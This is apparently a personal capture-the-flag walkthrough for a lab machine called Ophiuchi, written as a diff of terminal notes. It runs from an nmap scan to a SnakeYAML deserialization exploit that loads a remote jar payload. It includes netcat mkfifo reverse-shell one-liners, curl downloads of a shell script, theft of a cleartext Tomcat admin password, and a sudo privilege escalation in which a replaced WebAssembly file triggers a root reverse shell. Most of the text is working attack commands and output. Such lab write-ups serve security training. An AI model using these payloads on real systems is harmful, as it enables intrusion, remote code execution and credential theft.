@@ -1,0 +1,293 @@
+Machine-Name : Ophiuchi
+IP-Address   : 10.129.195.24
+
+Command-Line: sudo nmap -p- -A -T4 10.129.195.24
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 13:32 EDT
+    Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+    NSE Timing: About 0.00% done
+    Pre-scan script results:
+    | broadcast-avahi-dos:
+    |   Discovered hosts:
+    |     224.0.0.251
+    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+    |_  Hosts are all up (not vulnerable).
+    Nmap scan report for 10.129.195.24
+    Host is up (0.054s latency).
+    Not shown: 65533 closed ports
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | vulners:
+    |   cpe:/a:openbsd:openssh:8.2p1:
+    |       EDB-ID:21018    10.0    https://vulners.com/exploitdb/EDB-ID:21018      *EXPLOIT*
+    |       CVE-2001-0554   10.0    https://vulners.com/cve/CVE-2001-0554
+    |       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
+    |       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
+    |       MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/        4.6     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/ *EXPLOIT*
+    |       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
+    |       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/      *EXPLOIT*
+    |       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/       *EXPLOIT*
+    |       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/       *EXPLOIT*
+    |       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/       *EXPLOIT*
+    |       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
+    |       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+    |_      CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
+    8080/tcp open  http    Apache Tomcat 9.0.38
+    | http-csrf:
+    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.195.24
+    |   Found the following possible CSRF vulnerabilities:
+    |
+    |     Path: http://10.129.195.24:8080/
+    |     Form id: data
+    |_    Form action: Servlet
+    |_http-dombased-xss: Couldn't find any DOM based XSS.
+    | http-enum:
+    |   /manager/html/upload: Apache Tomcat (401 )
+    |_  /manager/html: Apache Tomcat (401 )
+    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+    | vulners:
+    |   cpe:/a:apache:tomcat:9.0.38:
+    |       CVE-2021-30640  5.8     https://vulners.com/cve/CVE-2021-30640
+    |       SSV:99316       5.0     https://vulners.com/seebug/SSV:99316    *EXPLOIT*
+    |       CVE-2021-33037  5.0     https://vulners.com/cve/CVE-2021-33037
+    |       CVE-2021-25122  5.0     https://vulners.com/cve/CVE-2021-25122
+    |       CVE-2020-17527  5.0     https://vulners.com/cve/CVE-2020-17527
+    |       CVE-2021-25329  4.4     https://vulners.com/cve/CVE-2021-25329
+    |       CVE-2020-9484   4.4     https://vulners.com/cve/CVE-2020-9484
+    |_      CVE-2021-24122  4.3     https://vulners.com/cve/CVE-2021-24122
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=8/6%OT=22%CT=1%CU=44375%PV=Y%DS=2%DC=T%G=Y%TM=610D7313
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+    OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 256/tcp)
+    HOP RTT      ADDRESS
+    1   52.58 ms 10.10.14.1
+    2   52.71 ms 10.129.195.24
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 210.81 seconds
+
+
+Broswer: 10.129.195.24:8080
+Notes: Java YAML parser.
+
+Browser: Java deserialization YAML
+URL: https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
+Notes: Reading the exploit led me to this code:
+URL: https://github.com/artsploit/yaml-payload
+
+Notes: Cloned the payload to Ophiuchi folder.
+Result:
+    ~/HackingTools/yaml-payload
+
+Notes: Inserted malicious code into the YAML parser.
+Malicious-Code:
+    !!javax.script.ScriptEngineManager [
+      !!java.net.URLClassLoader [[
+        !!java.net.URL ["http://10.10.14.115/yaml-payload.jar"]
+      ]]
+    ]
+
+Command-Line: touch shell.sh
+Result:
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 9001 >/tmp/f
+
+(1) - Runtime.getRuntime().exec("curl 10.10.14.115/shell.sh -o /tmp/shell.sh");
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+Notes: *Executed Malicious Code*
+
+(2) - Runtime.getRuntime().exec("bash /tmp/shell.sh");
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+Notes: *Executed Malicious Code*
+
+Notes: The above commands had to be run as 2 payloads.
+Result:
+    $
+    *** REVERSE SHELL ***
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    tomcat@ophiuchi:/$
+
+tomcat@ophiuchi:/$: CNTRL + Z
+Command-Line: stty raw -echo
+Command-Line: fg
+Command-Line: Enter
+Result:
+    tomcat@ophiuchi:/$
+
+tomcat@ophiuchi:/$cd dev/shm
+
+Command-Line: sudo python3 -m http.server --bind 10.10.14.115 80
+tomcat@ophiuchi:/dev/shm$ curl 10.10.14.115/LinEnum.sh -o LinEnum.sh
+tomcat@ophiuchi:/dev/shm$ chmod +x LinEnum.sh
+tomcat@ophiuchi:/dev/shm$ ./LinEnum.sh -t 1
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+    JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64
+    JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+    PWD=/dev/shm
+    LOGNAME=tomcat
+    CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC
+    HOME=/opt/tomcat
+    LANG=en_US.UTF-8
+    CATALINA_PID=/opt/tomcat/temp/tomcat.pid
+    INVOCATION_ID=77d37972f3af4a0790abeb5009b6e740
+    CATALINA_BASE=/opt/tomcat
+    TERM=xterm
+    CATALINA_HOME=/opt/tomcat
+    USER=tomcat
+    SHLVL=1
+    JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
+    JOURNAL_STREAM=9:23495
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+    OLDPWD=/opt/tomcat/conf
+    _=/usr/bin/env
+
+Notes: /opt/tomcat appears to be where TomCat is located.
+
+tomcat@ophiuchi:/dev/shm$ cat /opt/tomcat/conf/tomcat-users.xml
+Result:
+    <user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+
+Notes: Found password "whythereisalimit" for username "admin".
+
+tomcat@ophiuchi:/dev/shm$ su admin
+Password: whythereisalimit
+Result:
+    *** USER ACCESS ***
+
+admin@ophiuchi:/$ cat /home/admin/user.txt
+Result:
+    89c459616e9dc222b44f189b7687971e
+    *** USER OWNED ***
+
+admin@ophiuchi:/dev/shm$ sudo -l
+Result:
+    Matching Defaults entries for admin on ophiuchi:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User admin may run the following commands on ophiuchi:
+        (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+    admin@ophiuchi:/dev/shm$
+    admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+    panic: runtime error: index out of range [0] with length 0
+
+    goroutine 1 [running]:
+    github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports.func1(0x0, 0x0, 0xc000040c90, 0x5d1200, 0x200000003)
+            /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:94 +0x201
+    github.com/wasmerio/wasmer-go/wasmer.newInstanceWithImports(0xc000086020, 0xc000040d48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc000040d70)
+            /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:137 +0x1d3
+    github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports(0x0, 0x0, 0x0, 0xc000086020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, ...)
+            /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:87 +0xa6
+    github.com/wasmerio/wasmer-go/wasmer.NewInstance(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, 0x1)
+            /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:82 +0xc9
+    main.main()
+            /opt/wasm-functions/index.go:14 +0x6d
+    exit status 2
+
+admin@ophiuchi:/tmp$ cat /opt/wasm-functions/index.go
+Result:
+    package main
+
+    import (
+            "fmt"
+            wasm "github.com/wasmerio/wasmer-go/wasmer"
+            "os/exec"
+            "log"
+    )
+
+
+    func main() {
+            bytes, _ := wasm.ReadBytes("main.wasm")
+
+            instance, _ := wasm.NewInstance(bytes)
+            defer instance.Close()
+            init := instance.Exports["info"]
+            result,_ := init()
+            f := result.String()
+            if (f != "1") {
+                    fmt.Println("Not ready to deploy")
+            } else {
+                    fmt.Println("Ready to deploy")
+                    out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+                    if err != nil {
+                            log.Fatal(err)
+                    }
+                    fmt.Println(string(out))
+            }
+    }
+
+Notes: "main.wasm" is encrypted. SCP'ing the file to local kali box to decrypt using "wabt"
+URL: https://github.com/WebAssembly/wabt
+
+kali@kali:~/HackingTools/wabt/bin$ scp admin@10.129.195.24:/opt/wasm-functions/main.wasm .
+Password: whythereisalimit
+Result:
+    ~/HackingTools/wabt/bin/main.wasm
+    *** SUCCESS ***
+
+kali@kali:~/HackingTools/wabt/bin$ ./wasm-decompile main.wasm
+Result:
+    export memory memory(initial: 16, max: 0);
+
+    global g_a:int = 1048576;
+    export global data_end:int = 1048576;
+    export global heap_base:int = 1048576;
+
+    table T_a:funcref(min: 1, max: 1);
+
+    export function info():int {
+      return 0
+    }
+
+Notes: Creating a .wat file which has a function "info", and returns 1 as output. Converting the text .wat into a binary .wasm file.
+
+kali@kali:~/HackingTools/wabt/bin$ touch main.wat
+kali@kali:~/HackingTools/wabt/bin$ atom main.wat
+Result:
+(module
+  (func (export "info") (result i32)
+    i32.const 1
+  )
+)
+
+kali@kali:~/HackingTools/wabt/bin$ mv main.wasm main-original-delet.wasm
+kali@kali:~/HackingTools/wabt/bin$ ./wat2wasm main.wat -o main.wasm
+kali@kali:~/HackingTools/wabt/bin$ scp main.wasm admin@10.129.195.24:/tmp/main.wasm
+
+admin@ophiuchi:/tmp$ touch deploy.sh
+Result:
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 9002 >/tmp/f
+
+admin@ophiuchi:/tmp$ chmod +x deploy.sh
+admin@ophiuchi:/tmp$ chmod +x main.wasm
+
+Command-Line: nc -lvnp 9002
+admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Result:
+    *** REVERSE SHELL ***
+    *** ROOT ACCESS ***
+
+root@ophiuchi:~# cat root.txt
+Result:
+    8ef4ac0f5f6c04fb39b8c733fee9e961
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
